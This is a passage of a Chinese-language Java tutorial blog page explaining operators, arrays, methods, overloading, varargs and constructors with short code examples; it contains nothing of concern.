</p><p>接口（interface）</p><p>数组（[]）</p><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p>＋-作为单元运算符存在时，表示正负</p><p>1.＋</p><p>＋左右两边没有字符串，则进行数值运算。</p><p>＋左右两边有字符串，进行字符串拼接，如果不是字符串会<strong>转换成字符串</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-number">100</span>+<span class="hljs-number">98</span>);<span class="hljs-comment">//198</span><br>System.out.println(<span class="hljs-string">&#x27;a&#x27;</span>+<span class="hljs-number">1</span>);<span class="hljs-comment">//98</span><br>System.out.println(<span class="hljs-string">&quot;a&quot;</span>+<span class="hljs-number">1</span>+<span class="hljs-number">3</span>);<span class="hljs-comment">//a13</span><br>System.out.println(<span class="hljs-number">1</span>+<span class="hljs-number">3</span>+<span class="hljs-string">&quot;a&quot;</span>);<span class="hljs-comment">//4a</span><br></code></pre></td></tr></table></figure><p>2.%</p><p><strong>a%b=&#x3D;a-a&#x2F;b*b</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-number">10</span>%<span class="hljs-number">4</span>);<span class="hljs-comment">//2</span><br>System.out.println(-<span class="hljs-number">10</span>%<span class="hljs-number">4</span>);          <span class="hljs-comment">//-2</span><br>System.out.println(<span class="hljs-number">10</span>%-<span class="hljs-number">4</span>);<span class="hljs-comment">//2</span><br>System.out.println(-<span class="hljs-number">10</span>%-<span class="hljs-number">4</span>);<span class="hljs-comment">//-2 </span><br></code></pre></td></tr></table></figure><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>&amp; 和|不管真假都运算</p><p>HEX编码</p><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h2><h3 id="动态初始化"><a href="#动态初始化" class="headerlink" title="动态初始化"></a>动态初始化</h3><p>​元素类型[ ]  数组名&#x3D; new 元素类型[数组长度]；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[]  arr=<span class="hljs-keyword">new</span>  <span class="hljs-title class_">int</span>[<span class="hljs-number">5</span>];<br></code></pre></td></tr></table></figure><h3 id="静态初始化"><a href="#静态初始化" class="headerlink" title="静态初始化"></a>静态初始化</h3><p>元素类型[ ]  数组名&#x3D;new 元素类型[ ]{元素，元素，元素…};</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[]  arr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[ ]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br><span class="hljs-type">int</span>[] arr=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br></code></pre></td></tr></table></figure><p>相当于 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] arr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">5</span>];<br>arr[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>,arr[<span class="hljs-number">1</span>]=<span class="hljs-number">2</span>,arr[<span class="hljs-number">2</span>]=<span class="hljs-number">3</span>,arr[<span class="hljs-number">3</span>]=<span class="hljs-number">4</span>,arr[<span class="hljs-number">4</span>]=<span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure><p>e.g</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">char</span>[] chars=&#123;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>&#125;;<br><span class="hljs-type">char</span> chars1[]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[]&#123;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>&#125;;<br></code></pre></td></tr></table></figure><h3 id="数组创建后没有赋值就是默认值"><a href="#数组创建后没有赋值就是默认值" class="headerlink" title="数组创建后没有赋值就是默认值"></a>数组创建后没有赋值就是默认值</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">long</span>/<span class="hljs-type">int</span>/<span class="hljs-type">short</span>/<span class="hljs-type">byte</span> <span class="hljs-number">0</span><br><br><span class="hljs-type">float</span>/<span class="hljs-type">double</span> <span class="hljs-number">0.0</span><br><br><span class="hljs-type">boolean</span> <span class="hljs-literal">false</span><br><br>String <span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><h3 id="数组使用步骤"><a href="#数组使用步骤" class="headerlink" title="数组使用步骤"></a>数组使用步骤</h3><p>声明数组-&gt;开辟空间-&gt;给数组各个元素赋值-&gt;使用数组</p><h3 id="数组成员的赋值和读取"><a href="#数组成员的赋值和读取" class="headerlink" title="数组成员的赋值和读取"></a>数组成员的赋值和读取</h3><h3 id="下标越界会抛异常"><a href="#下标越界会抛异常" class="headerlink" title="下标越界会抛异常"></a>下标越界会抛异常</h3><p><strong>数组下标越界异常</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">int</span>[] arr=new int[<span class="hljs-number">3</span>];<br><span class="hljs-attribute">System</span>.out.println(arr[<span class="hljs-number">3</span>]);//有效下标为<span class="hljs-number">0</span>，<span class="hljs-number">1</span>，<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><strong>空指针异常</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">int[] arr<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h3 id="数组遍历"><a href="#数组遍历" class="headerlink" title="数组遍历"></a>数组遍历</h3><p><strong>数组名.length</strong>获取数组长度</p><p>数组扩容</p><h3 id="值传递与引用传递"><a href="#值传递与引用传递" class="headerlink" title="值传递与引用传递"></a>值传递与引用传递</h3><h4 id="a-栈内存"><a href="#a-栈内存" class="headerlink" title="a.栈内存"></a>a.栈内存</h4><p>​存储局部变量，离开作用域，自动释放</p><h4 id="b-堆内存"><a href="#b-堆内存" class="headerlink" title="b.堆内存"></a>b.堆内存</h4><p>​数组和对象，通过 new 建立的实例都放在堆内存中</p><p>​当没有任何引用指向实例的时候，gc 会不定时回收</p><p>​实例中的变量都有默认初始化值，建议手动初始化</p><p>​引用类型的初始化为 null</p><h4 id="c-方法区、本地方法区"><a href="#c-方法区、本地方法区" class="headerlink" title="c.方法区、本地方法区"></a>c.方法区、本地方法区</h4><h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><h3 id="二维数组定义和长度"><a href="#二维数组定义和长度" class="headerlink" title="二维数组定义和长度"></a>二维数组定义和长度</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>&#123;<span class="hljs-number">1</span>，<span class="hljs-number">2</span>，<span class="hljs-number">3</span>&#125;，<br>&#123;<span class="hljs-number">4</span>，<span class="hljs-number">5</span>，<span class="hljs-number">6</span>&#125;<br>&#125;<br><span class="hljs-type">int</span>[][] arr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>];<br>arr[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]=<span class="hljs-number">100</span>;<br>System.out.println(arr.length); <span class="hljs-comment">//2，二维数组长度</span><br>System.out.println(arr[<span class="hljs-number">0</span>].length);<br>System.out.println(arr[<span class="hljs-number">1</span>].length);<span class="hljs-comment">//3，个数</span><br><br><br><br>&#123;<br>&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;,<br>&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;<br>&#125;<br><span class="hljs-type">int</span>[][] arr2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][];<span class="hljs-comment">//先开辟空间，2行，再继续取列数</span><br>arr2[<span class="hljs-number">0</span>]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>];<br>arr2[<span class="hljs-number">1</span>]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>];<br><br><br><br><span class="hljs-type">int</span>[][] arr3=&#123;<br>&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;,<br>&#123;<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="二维数组其他定义方式"><a href="#二维数组其他定义方式" class="headerlink" title="二维数组其他定义方式"></a>二维数组其他定义方式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] x;<span class="hljs-type">int</span> x[];<br><span class="hljs-type">int</span>[][] y;<span class="hljs-type">int</span> y[][];<span class="hljs-type">int</span> [] y[];<br></code></pre></td></tr></table></figure><p>e.g.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1.</span><br>String foo=<span class="hljs-string">&quot;blue&quot;</span>;<br>        <span class="hljs-type">boolean</span>[] bar=<span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">if</span>(bar[<span class="hljs-number">0</span>])&#123;<br>            foo=<span class="hljs-string">&quot;green&quot;</span>;<br>        &#125;<br>        System.out.println(foo);<br><span class="hljs-comment">//输出blue</span><br><span class="hljs-number">2.</span><br><span class="hljs-type">char</span>[] arr1 = &#123;<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>&#125;;<br>        <span class="hljs-type">char</span>[] arr2 = arr1;<br>        arr2[<span class="hljs-number">2</span>] = <span class="hljs-string">&#x27;x&#x27;</span>;<br>        System.out.println(arr1[<span class="hljs-number">2</span>]);<br><span class="hljs-comment">//输出x</span><br><span class="hljs-number">3.</span><br>随机生成十个整数<br><span class="hljs-type">int</span>[] arr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)&#123;<br>            arr[i]=(<span class="hljs-type">int</span>)(Math.random()*<span class="hljs-number">100</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++)&#123;<br>            System.out.println(arr[i]);<br>        &#125;<br><span class="hljs-comment">//倒序打印</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=arr.length-<span class="hljs-number">1</span>;i&gt;=<span class="hljs-number">0</span>;i--)&#123;<br>            System.out.println(arr[i]);<br>        &#125;<br><span class="hljs-comment">//求均值</span><br>        <span class="hljs-type">int</span> sum=arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;arr.length;i++)&#123;<br>            sum +=arr[i];<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;均值&quot;</span>+sum/arr.length);<br><span class="hljs-comment">//求最大值及其索引</span><br>        <span class="hljs-type">int</span> max=arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">int</span> maxIndex=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++)&#123;<br>            <span class="hljs-keyword">if</span>(max&lt;arr[i])&#123;<br>                max=arr[i];<br>                maxIndex=i;<br>            &#125;<br>        &#125;<br>        System.out.println(max+<span class="hljs-string">&quot; &quot;</span>+maxIndex);<br></code></pre></td></tr></table></figure><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> a=<span class="hljs-number">164</span>;<br>      StringBuilder stringBuilder=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>      <span class="hljs-type">char</span>[] chars=&#123;<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;F&#x27;</span>&#125;;<br>      <span class="hljs-keyword">while</span>(a&gt;<span class="hljs-number">0</span>)&#123;<br>          <span class="hljs-type">int</span> index=a%<span class="hljs-number">16</span>;<br>          <span class="hljs-type">char</span> temp=chars[index];<br>          stringBuilder.append(temp);<br>          a=a/<span class="hljs-number">16</span>;<br>      &#125;<br>      System.out.println(stringBuilder.reverse().toString());<br><br></code></pre></td></tr></table></figure><h1 id="类、属性、对象"><a href="#类、属性、对象" class="headerlink" title="类、属性、对象"></a>类、属性、对象</h1><h2 id="类的定义方法"><a href="#类的定义方法" class="headerlink" title="类的定义方法"></a>类的定义方法</h2><h3 id="方法（函数-成员方法-method-）的定义"><a href="#方法（函数-成员方法-method-）的定义" class="headerlink" title="方法（函数&#x2F;成员方法&#x2F; method ）的定义"></a>方法（函数&#x2F;成员方法&#x2F; method ）的定义</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java">访问修饰符 返回值类型 方法名（形参列表）&#123;<br>语句；<br>...<br><span class="hljs-keyword">return</span> 返回值；<br>&#125;<br>e.g.<br><span class="hljs-keyword">void</span> <span class="hljs-title function_">butt3rf1y</span><span class="hljs-params">()</span>&#123;...&#125;<br><span class="hljs-comment">//可以类比C语言的函数定义</span><br><br>类内部调用<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br> test();<br> &#125;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> &#123;<br>System.out.println(<span class="hljs-string">&quot;test&quot;</span>);<br> &#125;<br>&#125;<br><br>类外部调用<br>Main.java<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>Cat cat=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();<br> cat.miao();<br> &#125;<br>&#125;<br>Cat.java<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">miao</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;喵&quot;</span>);<br>        <span class="hljs-keyword">return</span>；（可以省略）<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>一个方法只能返回一个值，要返回多个值可以用数组，可以为任意类型，包括基本数据类型和引用类型，<strong>返回值类型必须和 return 的值类型一致或兼容</strong></p><p>当函数没有返回值时，return 可以省略</p><h3 id="参数（类比C语言）"><a href="#参数（类比C语言）" class="headerlink" title="参数（类比C语言）"></a>参数（类比C语言）</h3><p>一个方法可以没有参数或多个参数，中间用逗号隔开（类比C语言）</p><h3 id="方法体"><a href="#方法体" class="headerlink" title="方法体"></a>方法体</h3><p>类比C语言函数体</p><p><strong>不可以在方法体内部定义方法</strong></p><h3 id="方法传参机制"><a href="#方法传参机制" class="headerlink" title="方法传参机制"></a>方法传参机制</h3><p><strong>a.方法嵌套顺序</strong></p><p>执行方法时会独立开辟栈空间,执行完毕或执行到 return 时，就会返回到调用方法的地方，返回后继续执行后面的代码，main 方法执行完毕，程序结束</p><p><strong>b.值传递&#x2F;值拷贝，形参任何改变不影响实参</strong></p><p><strong>c.引用传递，传递地址，形参改变可能影响实参</strong></p><p><strong>d.String 的传递</strong></p><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p>属性（成员变量&#x2F;字段&#x2F; field ）的概念</p><p>属性定义语法与变量一致，多了访问修饰符</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">访问修饰符 属性类型 属性名<br></code></pre></td></tr></table></figure><p>属性类型可以为任意类型，可以是基本数据类型和引用类型，如果没有初始化，有默认值，和数组一致</p><h3 id="Static"><a href="#Static" class="headerlink" title="Static"></a>Static</h3><h4 id="静态属性（类属性）与实例属性（对象属性）"><a href="#静态属性（类属性）与实例属性（对象属性）" class="headerlink" title="静态属性（类属性）与实例属性（对象属性）"></a>静态属性（类属性）与实例属性（对象属性）</h4><p>静态属性，只有一份，可以通过 <strong>类名.属性名&#x2F;对象.属性名</strong>来赋值和访问</p><p>实例属性，每个对象有一份，只能通过 <strong>对象.属性名</strong>来赋值和访问</p><h4 id="静态方法和实例方法（对象方法）"><a href="#静态方法和实例方法（对象方法）" class="headerlink" title="静态方法和实例方法（对象方法）"></a>静态方法和实例方法（对象方法）</h4><p>静态方法只能调用静态方法，不能访问实例属性</p><p>实例方法中可以调用静态方法和实例方法，也可以访问静态属性和实例属性</p><h4 id="补全method方法"><a href="#补全method方法" class="headerlink" title="补全method方法"></a>补全method方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(method(method(<span class="hljs-number">100.2</span>,<span class="hljs-number">1.0</span>),<span class="hljs-number">100</span>))<br><br><span class="hljs-keyword">static</span> <span class="hljs-type">double</span> <span class="hljs-title function_">method</span><span class="hljs-params">(<span class="hljs-type">double</span> a,<span class="hljs-type">double</span> b)</span>&#123;<br>  <span class="hljs-keyword">return</span> a+b;<br> &#125;<br></code></pre></td></tr></table></figure><p>e.g.</p><p>定义一个find方法，实现对字符串数组元素进行查找，并返回索引，找不到返回-1；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">String[] a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>&#125;;<br>  String b=<span class="hljs-string">&quot;c&quot;</span>;<br>  System.out.println(find(a,b));<br>  <br> &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(String[] a,String b)</span> &#123;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; a.length; i++) &#123;<br>        <span class="hljs-keyword">if</span> (a[i] == b) &#123;<br>          <span class="hljs-keyword">return</span> i;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h1><p>同一个类中，允许存在一个以上的同名方法，只要它们的参数个数或者参数类型，参数顺序不同即可，<strong>与返回值类型无关</strong>，只看参数列表</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>       <br>        System.out.println(<span class="hljs-string">&quot;abc0&quot;</span>);<br>        System.out.println(<span class="hljs-string">&#x27;a&#x27;</span>);<br>        System.out.println(<span class="hljs-literal">false</span>);<br>        System.out.println(<span class="hljs-number">1000.1</span>);<br>        System.out.println(<span class="hljs-number">123</span>);<br>        test(<span class="hljs-string">&quot;x&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(String a)</span>&#123;<br>        System.out.println(a);<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span>&#123;<br>        System.out.println(a);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span>... nums)</span>&#123; &#125;<br></code></pre></td></tr></table></figure><p>可变参数本质就是数组，实参可以为0个或任意多个</p><p>可变参数的实参可以为数组，这时候只能传一个参数</p><p>形参列表中只能出现一个可变参数</p><p>可变参数可以和普通参数以前放在形参列表，但必须保证可变参数在最后一个西餐列表中只能出现一个可变参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>       <br>       <span class="hljs-type">int</span>[] a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>&#125;;<br>        System.out.println(sum(<span class="hljs-string">&quot;java&quot;</span>,<span class="hljs-string">&quot;cpp&quot;</span>,a));<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(String d,String b,<span class="hljs-type">int</span>... a)</span>&#123;<br>        <span class="hljs-type">int</span> result=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;a.length;i++)&#123;<br>            result+=a[i];<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="构造器-构造方法-构造函数"><a href="#构造器-构造方法-构造函数" class="headerlink" title="构造器&#x2F;构造方法&#x2F;构造函数"></a>构造器&#x2F;构造方法&#x2F;构造函数</h1><h2 id="构造器特点"><a href="#构造器特点" class="headerlink" title="构造器特点"></a>构造器特点</h2><p>与类名一致，<strong>无返回值</strong>；</p><p>当对象创建时，会自动调用对应的构造器</p><p>如果没有定义构造器，会自动生成默认的无参构造器（默认构造器）</p><p>一个类可以定义多个不同的构造器，即构造器重载</p><p>一旦定义了构造器，默认的构造器就覆盖了，就不能再使用默认的无参构造器，除非自己显示的定义一下</p><h2 id="对象创建流程"><a href="#对象创建流程" class="headerlink" title="对象创建流程"></a>对象创建流程</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>       <span class="hljs-type">int</span> age=<span class="hljs-number">90</span>;<br>       String name;<br>       Person(String n,<span class="hljs-type">int</span> a)&#123;<br>           name=n;<br>           age=a;<br>       &#125;<br>   &#125;<br>   Person p=<span 